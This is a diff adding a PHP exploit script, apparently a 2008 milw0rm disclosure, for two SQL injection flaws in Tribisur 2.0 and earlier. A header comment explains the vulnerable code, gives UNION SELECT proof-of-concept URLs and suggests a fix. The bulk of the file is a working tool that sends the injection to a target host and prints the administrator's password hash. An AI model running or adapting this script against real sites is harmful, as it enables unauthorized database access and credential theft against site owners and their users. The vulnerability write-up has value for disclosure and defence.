@@ -1,0 +1,125 @@
+#!/usr/bin/php -q
+<?php
+echo "[*]Tribisur <= 2.0 Remote SQL Injection Exploit\r\n";
+echo "[*]Coded by x0kster -x0kster[AT]gmail[DOT]com - \r\n";
+/*
+Script Download : http://www.comscripts.com/scripts/php.tribisur-20.1211.html
+
+Bug #1 in modules/forum/liste.php :
+
+ First, this bugged page is included through forum.php :
+    <?php
+     //forum.php
+     [...]
+ 34. if($action == "liste") {
+ 35. include ("./modules/forum/liste.php");
+ 36. }
+     [...]
+	?> 	
+	
+ And now the bugged code :-) :
+    <?php
+      //liste.php
+      [...]
+  5.  $select = 'SELECT * FROM categorie_du_forum WHERE id='.$cat.' ';
+  6.  $result = mysql_query($select,$link) or die ('Erreur : '.mysql_error() );
+  7.  $total = mysql_num_rows($result);
+      [...]
+    ?>
+    
+ So we can exploit it with this simple PoC:
+ forum.php?action=liste&cat=-1+union+select+0,concat(pseudo,0x3a,passe),0,0,0,0,0,0,0,0+from+utiliz+where+id=1
+      
+Bug #2 in cat_main.php :
+
+    <?php
+     //cat_main.php
+     [...]
+ 32. $select3 = 'SELECT * FROM menu WHERE valider="oui" AND id='.$id.' ';
+ 33. $result3 = mysql_query($select3,$link) or die ('Erreur : '.mysql_error() );
+ 34. $total3 = mysql_num_rows($result3);  
+     [...]
+     ?>
+     
+ So like the first we can exploit it with:
+ cat_main.php?id=-1+union+select+0,concat(pseudo,0x3a,passe),0,0,0,0,0,0+from+utiliz+where+id=1
+ 
+ Fix :
+ 
+     <?php
+      //liste.php
+      [...]
+  5.  if(!is_int($cat)){ die("Hacking Attempt"); }    
+  6.  $select = 'SELECT * FROM categorie_du_forum WHERE id='.$cat.' ';
+  7.  $result = mysql_query($select,$link) or die ('Erreur : '.mysql_error() );
+  8.  $total = mysql_num_rows($result);
+      [...]
+    ?>
+    
+    <?php
+     //cat_main.php
+     [...]
+ 32. if(!is_int($id)){ die("Hacking Attempt"); }       
+ 33. $select3 = 'SELECT * FROM menu WHERE valider="oui" AND id='.$id.' ';
+ 34. $result3 = mysql_query($select3,$link) or die ('Erreur : '.mysql_error() );
+ 35. $total3 = mysql_num_rows($result3);  
+     [...]
+     ?>
+ 
+Exploit :
+*/
+if ($argc<4) {
+ echo "[*]Usage: php ".$argv[0]." host path mode\r\n";
+ echo "[*]Mode: 1  -SQL Injection in cat_main.php-\r\n";
+ echo "         2  -SQL Injection in modules/forum/liste.php-\r\n";
+ echo "[*]Example:\r\n";
+ echo "[*]php ".$argv[0]." localhost /tribusur/ 1\r\n";
+ die;
+}
+
+function get_response($packet){
+ global $host, $response;
+ $socket=fsockopen(gethostbyname($host),80);
+ if (!$socket) { echo "[-]Error contacting $host.\r\n"; exit();}
+ fputs($socket,$packet);
+ $response='';
+ while (!feof($socket)) {
+  $response.=fgets($socket);
+    }
+ fclose($socket);
+}
+
+$host =$argv[1];
+$path =$argv[2];
+$mode =$argv[3];
+
+if($mode == "1"){
+ 
+ $packet ="GET ".$path."cat_main.php?id=-1+union+select+0,concat(0x78306b73746572,passe,0x78306b73746572),0,0,0,0,0,0+from+utiliz+where+id=1/*";
+ $packet.="Host: ".$host."\r\n";
+ $packet.="Connection: Close\r\n\r\n";
+ 
+}elseif($mode == "2"){
+ 
+ $packet ="GET ".$path."forum.php?action=liste&cat=-1+union+select+0,concat(0x78306b73746572,passe,0x78306b73746572),0,0,0,0,0,0,0,0+from+utiliz+where+id=1/*";
+ $packet.="Host: ".$host."\r\n";
+ $packet.="Connection: Close\r\n\r\n";
+ 
+}else{
+	echo "[-]Incorrect Mode.\r\n";
+	die;
+}
+
+get_response($packet);
+if(strstr($response,"x0kster")){
+	$hash = explode("x0kster",$response,32);
+	echo "[+]Ok, the admin hash is : $hash[1]\r\n";
+	die;
+}else{
+	echo "[-]Exploit filed, maybe fixed?\r\n";
+	die;
+}    
+
+?>
+
+# milw0rm.com [2008-01-05]
